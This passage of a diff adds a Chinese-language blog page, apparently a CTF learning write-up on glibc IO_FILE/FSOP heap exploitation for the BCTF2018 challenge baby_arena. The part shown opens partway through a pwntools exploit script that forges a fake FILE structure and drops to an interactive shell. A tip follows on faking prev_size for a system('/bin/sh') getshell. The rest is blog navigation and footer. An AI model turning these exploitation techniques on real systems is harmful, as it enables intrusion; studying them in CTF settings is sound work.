class="comment">#add(0x1400,&#x27;0xfbad000&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b free&#x27;)</span></span><br><span class="line">fake_IO = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">fake_IO += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO += p64(<span class="number">0x6020B0</span> - <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1400</span>,fake_IO[<span class="number">0x10</span>:])</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;4.exit&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、tips"><a href="#4、tips" class="headerlink" title="4、tips"></a>4、tips</h3><p>这里如果要用system传binsh的方式getshell的话，需要构造一下堆块的presize。因为我们伪造的fake IO FILE 是从它的presize位开始的</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/vEy5B6"><img src="https://s1.ax1x.com/2022/08/02/vEy5B6.png" alt="vEy5B6.png"></a></p>
+<p>我们的flag位对应的是堆头的presize。</p>
+<h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>开始这个系列是打算记录一下IO的学习之路，正如标题，目前还是一个pwn弟弟，要努力成长。这个例题调通挺久的，最近忙着驾考，而且脑袋经常想东想西的，导致效率真的很低下。不要想太多，活好当下才是最重要的。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/20/Game%5B1%5D%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/" rel="prev" title="Game[1]蓝帽杯初赛wp-pwn">
+      <i class="fa fa-chevron-left"></i> Game[1]蓝帽杯初赛wp-pwn
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">一、基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81IO-FILE%E7%9A%84%E4%B8%BB%E8%A6%81%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">1、IO FILE的主要结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-IO-FILE-plus"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 IO_FILE_plus</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-FILE"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 FILE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-IO-list-all-%E6%8C%87%E9%92%88"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3_IO_list_all 指针</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81FSOP"><span class="nav-number">1.2.</span> <span class="nav-text">2、FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 相关函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-FSOP%E7%9A%84%E8%A6%81%E7%82%B9"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 FSOP的要点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-%E5%B1%80%E9%99%90"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 局限</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81globe-max-fast%E4%BB%A5%E5%8F%8AfastbinY"><span class="nav-number">2.</span> <span class="nav-text">3、globe_max_fast以及fastbinY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%9Ababy-arena-BCTF2018"><span class="nav-number">3.</span> <span class="nav-text">二、例题：baby_arena_BCTF2018</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">1、程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">2、利用思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81exp%EF%BC%9A"><span class="nav-number">3.3.</span> <span class="nav-text">3、exp：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81tips"><span class="nav-number">3.4.</span> <span class="nav-text">4、tips</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">后记：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">A2ur2</p>
+  <div class="site-description" itemprop="description">在成为大赛pwn题签到员的路上</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">A2ur2</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
